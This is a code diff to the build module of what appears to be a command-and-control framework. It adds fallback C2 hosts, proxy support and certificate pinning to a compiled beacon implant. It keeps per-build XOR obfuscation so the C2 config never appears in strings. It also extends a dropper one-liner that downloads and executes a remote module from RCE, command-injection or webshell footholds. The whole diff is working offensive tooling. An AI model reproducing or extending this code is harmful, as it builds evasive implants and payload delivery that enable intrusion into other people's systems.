@@ -6,11 +6,12 @@ import base64
 import struct
 import subprocess
 import sys
-from typing import Optional
+from typing import List, Optional
 from rich.console import Console
 from phantom.utils.notifier import notifier
 from phantom.utils.build_helper import check_build_env
 from phantom.utils.c2_crypto import write_beacon_crypto_config, write_beacon_c2_config, crypto_fingerprint
+from phantom.utils.network import beacon_pin
 from phantom.utils.beacon_auth import write_beacon_auth_config
 from phantom.utils.malleable import write_malleable_config
 
@@ -164,14 +165,30 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                    arch: str = "x64", disable_anti: bool = False,
                    host: str = "127.0.0.1", port: int = 8080,
                    use_ssl: bool = True,
-                   malleable_profile: Optional[str] = None) -> Optional[str]:
+                   malleable_profile: Optional[str] = None,
+                   hosts: Optional[List[str]] = None,
+                   proxy: str = "") -> Optional[str]:
     """
     Compiles the C++ beacon for the specified platform and architecture.
     Embeds C2 keys and enrolls a unique per-beacon HMAC identity at build time.
     When PHANTOM_MTLS_REQUIRED=1, client certificate material and the pinned
     server fingerprint are generated into the protected build artifact.
+
+    `hosts` is the FALLBACK ladder behind `host` (from PHANTOM_C2_FALLBACK /
+    `c2.fallback` when not passed explicitly) and `proxy` an explicit proxy
+    URL (PHANTOM_C2_PROXY / `c2.proxy`); both are embedded so a filtered
+    endpoint or a proxy-only network does not cost the engagement.
     Returns the path to the compiled binary or None on failure.
     """
+    if hosts is None or not proxy:
+        try:
+            from phantom.utils.network import get_c2_fallbacks, get_c2_proxy
+            if hosts is None:
+                hosts = get_c2_fallbacks()
+            if not proxy:
+                proxy = get_c2_proxy()
+        except Exception:
+            hosts = hosts or []
     if not check_build_env(platform, arch):
         notifier.error(f"Build environment not ready for {platform} ({arch}).")
         return None
@@ -226,7 +243,8 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
     except Exception:
         ps_stager_b64 = ""
     write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl,
-                           ps_stager_b64=ps_stager_b64)
+                           ps_stager_b64=ps_stager_b64, hosts=list(hosts or []),
+                           proxy=proxy or "", pin=beacon_pin())
     write_malleable_config(beacon_dir, profile_path=malleable_profile)
     # Fresh XOR keystream per build so the C2 config never recurs in strings.
     _write_config_seed(beacon_dir)
@@ -1135,17 +1153,26 @@ def _wsl_path(p: str) -> str:
 
 
 def generate_remote_dropper(platform: str, lhost: str, lport: int,
-                            use_ssl: bool = True) -> str:
+                            use_ssl: bool = True,
+                            session_token: str = "") -> str:
     """One-liner that downloads and runs the compiled remote module.
 
     Serves the same role as the beacon dropper but for the remote module:
     a disposable fetch+exec chain usable from RCE/cmdi/webshell contexts.
     The module takes (host port use_https) as argv, so the compiled binary
     can be pointed at any listener at drop time.
+
+    Review-3: when `session_token` is supplied (the C2 issues one per
+    remote session) the dropper carries `rs=<token>` — an expiring,
+    revocable grant — instead of the global payload token that unlocks
+    every payload forever.
     """
     proto = "https" if use_ssl else "http"
-    from phantom.utils.c2_crypto import get_payload_token
-    token_param = f"auth={get_payload_token()}"
+    if session_token:
+        token_param = f"rs={session_token}"
+    else:
+        from phantom.utils.c2_crypto import get_payload_token
+        token_param = f"auth={get_payload_token()}"
 
     if platform == "windows":
         url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_windows?{token_param}"
